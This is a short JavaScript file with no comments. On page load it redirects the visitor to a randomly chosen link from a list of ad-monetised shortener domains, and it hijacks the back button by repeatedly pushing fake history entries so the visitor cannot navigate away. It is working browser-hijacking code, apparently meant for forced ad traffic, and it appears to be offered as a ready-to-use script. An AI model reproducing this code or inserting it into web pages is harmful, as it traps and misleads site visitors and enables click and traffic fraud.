var urls = ["https://besargaji.com/Q0RX1V",
            "https://link.bicolink.net/IfEpAc",
            "https://arahlink.id/X681kQD",
            "https://ouo.io/2JewaN",
            "https://adbull.me/386MF",
            "https://to.aoutoqw.xyz/Q7UdcZg",
            "https://go.aoutoqw.xyz/2txshsl"];

function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

